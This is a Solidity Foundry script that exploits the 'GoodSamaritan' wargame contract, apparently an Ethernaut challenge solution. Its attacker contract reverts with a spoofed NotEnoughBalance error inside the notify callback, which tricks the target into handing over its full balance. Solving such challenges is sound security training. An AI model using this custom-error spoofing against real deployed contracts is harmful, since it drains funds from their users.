// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "@forge-std/Script.sol";
import "../src/GoodSamaritan.sol";

contract Attack is INotifyable {
    GoodSamaritan public goodSamaritan;
    error NotEnoughBalance();

    constructor(address gsAddress) {
        goodSamaritan = GoodSamaritan(gsAddress);
    }

    function request() public {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 a) external {
        if(a == 10) {
            revert NotEnoughBalance();
        }
    }
}

contract GoodSamaritanScript is Script {
    GoodSamaritan public goodSamaritanContract;
    Coin public coinContract;
    Wallet public walletContract;

    function setUp() public {
        goodSamaritanContract = GoodSamaritan(payable(vm.envAddress("GOODSAMARITAN_CONTRACT")));  
        coinContract = goodSamaritanContract.coin();
        walletContract = goodSamaritanContract.wallet();  
    }
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack(address(goodSamaritanContract));
        attack.request();
        vm.stopBroadcast();
    }
}
